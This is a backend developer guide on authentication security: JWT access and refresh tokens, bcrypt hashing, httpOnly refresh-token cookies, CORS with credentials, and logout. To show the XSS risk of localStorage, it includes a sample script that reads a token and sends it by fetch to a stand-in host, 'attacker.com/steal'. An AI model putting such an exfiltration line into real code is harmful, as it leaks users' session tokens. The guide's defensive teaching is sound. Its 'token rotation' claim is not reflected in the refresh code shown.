# Authentication & Security

**Category:** Backend Development  
**Last Updated:** December 9, 2025

---

## JWT Authentication (Access + Refresh Tokens)

**When Adopted:** Epic 13 (Production Backend Architecture)  
**Why:** Stateless auth, scalable, mobile-friendly  
**Use Case:** Multi-session user authentication

### Minimal Example

```typescript
// 1. Install
npm install jsonwebtoken bcrypt
npm install -D @types/jsonwebtoken @types/bcrypt

import jwt from 'jsonwebtoken';

// 2. Generate tokens
function generateAccessToken(userId: string): string {
  return jwt.sign(
    { userId, type: 'access' },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );
}

function generateRefreshToken(userId: string): string {
  return jwt.sign(
    { userId, type: 'refresh' },
    process.env.JWT_REFRESH_SECRET!,
    { expiresIn: '7d' }
  );
}

// 3. Verify token middleware
function authenticate(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// 4. Refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET!);
    const newAccessToken = generateAccessToken(decoded.userId);
    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

### Password Hashing with bcrypt

```typescript
import bcrypt from "bcrypt";

// Hash password
async function hashPassword(plainPassword: string): Promise<string> {
  const salt = await bcrypt.genSalt(10);
  return bcrypt.hash(plainPassword, salt);
}

// Verify password
async function verifyPassword(plain: string, hashed: string): Promise<boolean> {
  return bcrypt.compare(plain, hashed);
}

// Login endpoint
app.post("/api/auth/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await prisma.user.findUnique({ where: { email } });
  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const valid = await verifyPassword(password, user.password);
  if (!valid) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const accessToken = generateAccessToken(user.id);
  const refreshToken = generateRefreshToken(user.id);

  res.json({ accessToken, refreshToken, user: { id: user.id, email: user.email } });
});
```

### httpOnly Cookies for Refresh Tokens (XSS Protection)

**When Adopted:** Epic 13 Story 13.3  
**Why:** Protect refresh tokens from XSS attacks; not accessible to JavaScript  
**Use Case:** Production-grade authentication security

#### Problem with localStorage

Storing refresh tokens in localStorage exposes them to XSS attacks:

```javascript
// BAD: Vulnerable to XSS
localStorage.setItem("refreshToken", token);

// Malicious script can steal token:
const stolen = localStorage.getItem("refreshToken");
fetch("https://attacker.com/steal", { body: stolen });
```

#### Solution: httpOnly Cookies

Store refresh tokens in httpOnly cookies (backend sets, JavaScript cannot access):

```javascript
// Backend: Set httpOnly cookie
app.post("/api/v1/auth/login", async (req, res) => {
  const { email, password } = req.body;

  // ... validate credentials ...

  const accessToken = generateAccessToken(user.id);
  const refreshToken = generateRefreshToken(user.id);

  // Set refresh token as httpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true, // Cannot be accessed by JavaScript
    secure: process.env.NODE_ENV === "production", // HTTPS-only in production
    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax", // CSRF protection
    path: "/", // Available to all routes
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });

  // Return only access token (short-lived, can be in localStorage)
  res.json({
    accessToken, // Frontend stores this in localStorage (15min expiry = low risk)
    user: { id: user.id, email: user.email },
  });
});

// Backend: Read refresh token from cookie
app.post("/api/v1/auth/refresh", async (req, res) => {
  const refreshToken = req.cookies.refreshToken; // Read from cookie

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
    const newAccessToken = generateAccessToken(decoded.userId);

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(401).json({ error: "Invalid refresh token" });
  }
});
```

#### Frontend Configuration

Frontend must include credentials in requests:

```typescript
// Frontend: All auth requests must include credentials
fetch("/api/v1/auth/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "include", // REQUIRED: Send cookies with request
  body: JSON.stringify({ email, password }),
});

// OR: Configure fetch wrapper
async function authFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include", // Always include cookies
  });
}
```

#### Backend CORS Configuration

CORS must allow credentials and specify origin (no wildcard):

```javascript
import cors from "cors";

// REQUIRED: Specific origin + credentials
app.use(
  cors({
    origin: process.env.FRONTEND_URL || "http://localhost:5173", // Specific origin (not *)
    credentials: true, // Allow cookies
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);

// MUST install cookie-parser middleware
import cookieParser from "cookie-parser";
app.use(cookieParser());
```

#### Environment-Aware sameSite (Development Proxy)

Development proxy (e.g., Vite localhost:5173 → localhost:3001) requires `sameSite: "lax"`:

```javascript
// Helper function for environment-aware cookie config
const setRefreshTokenCookie = (res, token) => {
  res.cookie("refreshToken", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    // Development: "lax" allows dev proxy (localhost:5173 → localhost:3001)
    // Production: "strict" for maximum security
    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
    path: "/",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });
};

// Usage
setRefreshTokenCookie(res, refreshToken);
```

#### Cookie Clearing (Logout)

Clearing cookies requires **exact matching options**:

```javascript
// Helper: Clear cookie with EXACT matching options
const clearRefreshTokenCookie = (res) => {
  res.clearCookie("refreshToken", {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
    path: "/", // MUST match original cookie path
  });
};

// Logout endpoint
app.post("/api/v1/auth/logout", async (req, res) => {
  // Delete session from database
  await prisma.session.delete({ where: { token: req.cookies.refreshToken } });

  // Clear cookie (MUST use matching options)
  clearRefreshTokenCookie(res);

  res.json({ success: true });
});
```

#### Manual Cookie Parsing Fallback

If `cookie-parser` middleware fails, add manual parsing:

```javascript
// Fallback: Manual cookie parsing
const getRefreshToken = (req) => {
  // Try cookie-parser first
  if (req.cookies?.refreshToken) {
    return req.cookies.refreshToken;
  }

  // Fallback: Parse manually
  const cookieHeader = req.headers.cookie;
  if (!cookieHeader) return null;

  const cookies = cookieHeader.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split("=");
    acc[key] = value;
    return acc;
  }, {});

  return cookies.refreshToken || null;
};

// Usage
app.post("/api/v1/auth/refresh", async (req, res) => {
  const refreshToken = getRefreshToken(req);
  // ... rest of logic
});
```

#### Key Security Benefits

- **XSS Protection**: Refresh token inaccessible to JavaScript (even if attacker injects script)
- **CSRF Protection**: `sameSite: strict` prevents cross-site request forgery
- **Secure Transport**: `secure: true` ensures cookies only sent over HTTPS in production
- **Short-Lived Access Tokens**: Even if access token stolen from localStorage, expires in 15min
- **Token Rotation**: Delete old refresh token on refresh (limits damage if stolen)

### Key Lessons

- Short-lived access tokens (15min), long-lived refresh (7d)
- Never store passwords in plain text
- Use bcrypt rounds: 10 for dev, 12+ for production
- Rotate refresh tokens on use (optional but secure)
- Store JWT secrets in environment variables
- Use httpOnly cookies for refresh tokens (XSS protection)
- sameSite "lax" for dev proxy, "strict" for production (environment-aware)
- Cookie clear options must match set options (especially path)
- CORS with credentials requires specific origin (never wildcard)
- Frontend must use credentials: 'include' (send cookies)

### When to Use

User authentication, API access control, mobile apps, production web apps requiring XSS protection

---

**Related Guides:**

- [Backend Architecture](./backend-architecture.md) — Auth middleware integration
- [Database & ORM](./backend-database.md) — User model design
